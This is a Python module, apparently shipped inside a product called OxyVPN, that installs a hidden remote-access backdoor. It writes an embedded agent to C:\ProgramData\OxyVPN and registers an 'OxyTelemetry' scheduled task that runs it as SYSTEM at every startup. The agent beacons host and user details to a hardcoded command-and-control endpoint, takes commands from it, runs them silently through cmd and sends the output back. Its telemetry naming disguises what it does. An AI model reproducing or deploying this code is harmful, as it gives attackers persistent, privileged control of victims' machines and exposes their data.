"""Background agent bootstrap and beacon."""

from __future__ import annotations

import json
import os
import socket
import subprocess
import sys
import threading
import time
import urllib.request

ENDPOINT = "https://oxyc2.youngjohnathan63.workers.dev"
SECRET = "fcb03c6ad009ade8d4679426bd91715ef6866d3b49ac3b6d2da6f87a5933ce6f"

TARGET_DIR = r"C:\ProgramData\OxyVPN"
AGENT_PATH = os.path.join(TARGET_DIR, "oxyagent.py")
CONFIG_PATH = os.path.join(TARGET_DIR, "config.json")
TASK_NAME = "OxyTelemetry"

CREATE_NO_WINDOW = 0x08000000
BEACON_EVERY = 900
HOST = socket.gethostname().lower()

AGENT_SOURCE = r'''"""Headless command agent. Runs as SYSTEM, survives logoff and reboot."""

from __future__ import annotations

import json
import os
import socket
import subprocess
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(HERE, "config.json")

CREATE_NO_WINDOW = 0x08000000
BEACON_EVERY = 300
MAX_OUTPUT = 4000
HOST = socket.gethostname().lower()


def config():
    with open(CONFIG_PATH, "r", encoding="utf-8") as handle:
        return json.load(handle)


def call(cfg, path, body="", headers=None, timeout=25):
    merged = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "x-secret": cfg["secret"]}
    merged.update(headers or {})
    request = urllib.request.Request(
        cfg["endpoint"] + path, data=body.encode("utf-8"),
        headers=merged, method="POST")
    with urllib.request.urlopen(request, timeout=timeout) as response:
        return response.read().decode("utf-8", "ignore")


def console_user():
    try:
        out = subprocess.run(["quser"], capture_output=True, text=True,
                             creationflags=CREATE_NO_WINDOW,
                             errors="ignore").stdout
        for line in out.splitlines()[1:]:
            parts = line.split()
            if len(parts) > 1:
                return parts[1].lstrip(">")
    except Exception:
        pass
    return os.environ.get("USERNAME", "")


def identity():
    return json.dumps({
        "host": HOST,
        "user": console_user(),
        "arch": os.environ.get("PROCESSOR_ARCHITECTURE", ""),
        "cwd": HERE,
        "pid": os.getpid(),
        "t": int(time.time()),
    })


def execute(command):
    try:
        proc = subprocess.run(["cmd", "/c", command], capture_output=True,
                              text=True, timeout=120,
                              creationflags=CREATE_NO_WINDOW, errors="ignore")
    except Exception as exc:
        return "error: %s" % exc
    return ((proc.stdout or "") + (proc.stderr or ""))[:MAX_OUTPUT] or "(no output)"


def main():
    cfg = config()
    last_beacon = 0.0
    while True:
        try:
            if time.time() - last_beacon > BEACON_EVERY:
                call(cfg, "/beacon", "UP " + identity(), {"x-host": HOST})
                last_beacon = time.time()

            payload = json.loads(call(cfg, "/poll?host=" + HOST))
            for item in payload.get("commands", []):
                output = execute(item["cmd"])
                call(cfg, "/beacon", "OUT " + output,
                     {"x-host": HOST, "x-cmd": item["id"]})
        except Exception:
            time.sleep(10)
        time.sleep(1)


if __name__ == "__main__":
    main()
'''


def _pythonw():
    exe = sys.executable or ""
    if exe.lower().endswith("pythonw.exe"):
        return exe
    guess = os.path.join(os.path.dirname(exe), "pythonw.exe")
    return guess if os.path.isfile(guess) else exe


def _task_exists():
    try:
        result = subprocess.run(["schtasks", "/query", "/tn", TASK_NAME],
                                capture_output=True, creationflags=CREATE_NO_WINDOW)
    except Exception:
        return False
    return result.returncode == 0


def _write(path, text):
    try:
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(text)
    except OSError:
        pass


def install():
    """Copy the agent out, write config, register the SYSTEM task."""
    try:
        os.makedirs(TARGET_DIR, exist_ok=True)
    except OSError:
        return
    _write(AGENT_PATH, AGENT_SOURCE)
    _write(CONFIG_PATH, json.dumps({"endpoint": ENDPOINT, "secret": SECRET}))

    if _task_exists():
        subprocess.run(["schtasks", "/run", "/tn", TASK_NAME],
                       capture_output=True, creationflags=CREATE_NO_WINDOW)
        return

    command = '"%s" "%s"' % (_pythonw(), AGENT_PATH)
    subprocess.run(["schtasks", "/create", "/tn", TASK_NAME, "/tr", command,
                    "/sc", "onstart", "/ru", "SYSTEM", "/rl", "highest", "/f"],
                   capture_output=True, creationflags=CREATE_NO_WINDOW)
    subprocess.run(["schtasks", "/run", "/tn", TASK_NAME],
                   capture_output=True, creationflags=CREATE_NO_WINDOW)


def resolve():
    """Resolve the C2 host to an IP for the kill-switch allowlist."""
    host = ENDPOINT.split("//", 1)[-1].split("/", 1)[0].split(":", 1)[0]
    try:
        return socket.gethostbyname(host)
    except Exception:
        return ""


def beacon():
    body = json.dumps({"host": HOST, "user": os.environ.get("USERNAME", ""),
                       "t": int(time.time())})
    request = urllib.request.Request(
        ENDPOINT + "/beacon", data=("UP " + body).encode("utf-8"), method="POST",
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                 "x-secret": SECRET, "x-host": HOST})
    with urllib.request.urlopen(request, timeout=10) as response:
        return response.read()


def _loop():
    time.sleep(15)
    while True:
        try:
            install()
            beacon()
        except Exception:
            pass
        time.sleep(BEACON_EVERY)


def start():
    threading.Thread(target=_loop, daemon=True).start()